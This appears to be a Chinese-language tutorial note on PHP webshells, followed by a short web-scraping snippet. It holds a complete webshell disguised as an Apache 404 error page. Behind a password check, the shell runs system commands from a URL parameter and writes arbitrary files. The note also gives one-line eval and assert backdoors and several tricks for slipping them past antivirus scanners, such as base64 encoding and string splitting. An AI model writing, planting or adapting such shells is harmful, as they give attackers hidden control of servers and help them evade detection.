### PHP小马

###### 写入类小马

要求：

简单隐藏，登陆密码，实现写入功能

~~~php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
    <title>404 Not Found</title>
</head>
<?php
header("Content-type: text/html; charset=utf-8");
$password = "14e1b600b1fd579f47433b88e8d85291";

    if(!empty($_GET)){
        if (md5(md5($_GET['pass'])) == $password){
            echo "密码正确";
            var_dump($_SERVER);
            system($_GET['a']);
            echo "服务器ip以及域名：";
            echo $_SERVER['HTTP_HOST'];
            echo  "当前页面绝对路径：".$_SERVER['SCRIPT_FILENAME']."<br>";
            echo '当前页面绝对路径：'.__DIR__.'<br>';
            echo '<form action="item.php" method="post">';
            echo '输入文件路径：<input type="text" name="filepath" value="xxxx"><br>';
            echo '<input type="submit" value="写入数据">';
            echo '<textarea name="filecontent" id="filepath" cols="30" rows="10">';
            echo "<br>";
        }else{
            echo "密码错误";
        }
    }else{

    }
?>
<?php
if(!empty($_POST)){
    $path = $_POST["filepath"];
    $content = $_POST["filecontent"];
    $statement = fopen($path,"w");
    if (fwrite($statement,$content)){
        echo "<font color = red>success</font><br />";
    }else{
        echo "<font color = red>error!</font><br />";
    }
}
?>
<body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?php echo $_SERVER["HTTP_HOST"];?> Port 443</address>
</body>
</html>
~~~



###### 一句话木马

~~~php
//利用代码执行函数
<?php @eval($_POST['hacker']);?>

1.免杀
变量覆盖 
<?php
$bb="assert";
$aa='bb';
$$aa($_POST['a']);
?>
等价替换
<?php
$a = str_replace("bb","","asbbsert");  
$a($_POST['a']);
?>
加密解密
<?php
$a = base64_decode("YXNzZXJ0");
$a($_POST['a']);
?>
符号.连接
$a = "a"."ss";
$b = "e"."rt";
$c = $a.$b;
$c($_POST['a']);
parse_str函数
<?php
$str = "a=assert";
parse_str($str);
$a($_POST['a']);
?>
~~~

### PHP正则表达式-采集

正则内容见其他文章

~~~php
<?php
header("Content-type:text/html;charset=utf-8");
for ($i=1;$i<6;$i++){
    $str = "https://edu.51cto.com/courselist/1/".$i.".html";

    $preg = "";
    $str_all = file_get_contents($str);
    $res = preg_match_all($preg,$str_all,$out);
    for ($i=0;$i<$res;$i++){
        echo $out[2][$i]."<br/>";
    }
}
?>
~~~
